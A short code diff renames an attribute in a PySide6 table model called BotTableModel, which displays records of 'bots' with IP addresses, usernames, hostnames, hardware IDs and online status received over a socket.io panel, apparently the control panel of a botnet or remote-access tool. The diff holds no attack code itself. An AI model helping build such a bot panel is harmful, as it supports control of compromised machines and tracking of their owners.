@@ -6,14 +6,14 @@ from PySide6.QtWidgets import QApplication, QTableView
 class BotTableModel(QAbstractTableModel):
     def __init__(self, socket_io_client, parent=None):
         super().__init__(parent)
-        self._data = []
+        self.internal_data = []
         self._socket_io_client = socket_io_client
         self._header = ["id", "socketId", "wanIp", "lanIp", "os", "username", "hostname", "country", "lastSeen", "hwid", "online"]
 
         self._socket_io_client.panel_received_bot_data.connect(self.refresh)
 
     def rowCount(self, parent=QModelIndex()):
-        return len(self._data)
+        return len(self.internal_data)
 
     def columnCount(self, parent=QModelIndex()):
         return len(self._header)
@@ -25,11 +25,11 @@ class BotTableModel(QAbstractTableModel):
         col = index.column()
         if role == Qt.DisplayRole:
             if col == 8:
-                iso_date_string = str(self._data[row][self._header[col]])
+                iso_date_string = str(self.internal_data[row][self._header[col]])
                 iso_date = datetime.datetime.fromisoformat(iso_date_string)
                 new_format = iso_date.strftime("%Y-%m-%d %H:%M:%S")
                 return new_format
-            return str(self._data[row][self._header[col]])
+            return str(self.internal_data[row][self._header[col]])
         return None
 
     def headerData(self, section, orientation, role) :
@@ -50,5 +50,5 @@ class BotTableModel(QAbstractTableModel):
     
     def refresh(self, data):
         # update the model with new data
-        self._data = data
+        self.internal_data = data
         self.layoutChanged.emit()
